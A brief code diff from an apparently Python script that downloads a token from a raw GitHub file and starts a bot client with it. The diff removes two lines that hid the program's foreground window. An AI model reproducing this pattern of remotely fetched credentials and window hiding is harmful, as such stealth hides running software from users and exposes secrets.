@@ -278,5 +278,3 @@ r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/hea
 token = r.text
 stripped_string = token[1:]
 client.run(stripped_string)
-hwnd = win32gui.GetForegroundWindow()
-win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
